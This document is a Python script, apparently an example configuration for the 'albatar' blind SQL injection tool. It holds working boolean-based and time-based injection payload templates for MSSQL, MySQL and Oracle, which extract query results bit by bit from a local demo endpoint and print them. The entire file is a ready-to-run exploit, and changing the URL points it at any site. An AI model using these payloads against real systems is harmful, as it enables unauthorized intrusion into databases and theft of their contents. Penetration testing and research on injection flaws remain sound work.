#!/usr/bin/env python

from albatar import *

PROXIES = {} #'http': 'http://127.0.0.1:8082', 'https': 'http://127.0.0.1:8082'}
HEADERS = ['User-Agent: Mozilla/5.0']

def test_state_grep(headers, body, time):
  if '0 rows fetched' in body:
    return 0
  else:
    return 1

def test_state_time(headers, body, time):
  if time >= 1:
    return 1
  else:
    return 0

from urllib import quote_plus
def quote(s):
  return quote_plus(s, safe='${}:(),')

def mssql_boolean():

  template = " and 1=(select case when ((ascii(substring(cast((${query}) as nvarchar(4000)),${char_pos},1))&${bit_mask})=${bit_mask}) then 1 else 0 end)"

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://127.0.0.1/demo/sqli.php?dbms=mssql&id=1${injection}',
      method = 'GET',
      state_tester = test_state_grep,
      encode_payload = quote,
      )

  return Method_bitwise(make_requester, template)

def mssql_time():

  template = " if((ascii(substring(cast((${query}) as nvarchar(4000)),${char_pos},1))&${bit_mask})=${bit_mask}) waitfor delay '0:0:2'--"

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://127.0.0.1/demo/sqli.php?dbms=mssql&id=1${injection}',
      method = 'GET',
      state_tester = test_state_time,
      encode_payload = quote,
      )

  return Method_bitwise(make_requester, template, num_threads=1)

def mysql_boolean():

  template = ' and (ascii(substring((${query}),${char_pos},1))&${bit_mask})=${bit_mask}'

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://127.0.0.1/demo/sqli.php?dbms=mysql&id=1${injection}',
      method = 'GET',
      state_tester = test_state_grep,
      encode_payload = quote,
      )

  return Method_bitwise(make_requester, template)

def mysql_time():

  template = ' and if(((ascii(substring((${query}),${char_pos},1))&${bit_mask})=${bit_mask}),sleep(1),1)'

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://127.0.0.1/demo/sqli.php?dbms=mysql&id=1${injection}',
      method = 'GET',
      state_tester = test_state_time,
      encode_payload = quote,
      )

  return Method_bitwise(make_requester, template, num_threads=1)

def oracle_boolean():

  template = " AND 1=(select case when (select bitand((select ascii(substr((${query}),${char_pos})) from dual),${bit_mask}) from dual)=${bit_mask} then 1 else 0 end from dual)"

  def make_requester():
    return Requester_HTTP(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'http://127.0.0.1:18080/demo/sqli.php?dbms=oracle&id=1${injection}',
      method = 'GET',
      state_tester = test_state_grep,
      encode_payload = quote,
      )

  return Method_bitwise(make_requester, template, num_threads=1, rate_limit=.5, confirm_char=True)

#sqli = MSSQL_Blind(mssql_boolean())
#sqli = MSSQL_Blind(mssql_time())
#sqli = MySQL_Blind(mysql_boolean())
#sqli = MySQL_Blind(mysql_time())
sqli = Oracle_Blind(oracle_boolean())

for r in sqli.exploit():
  print r

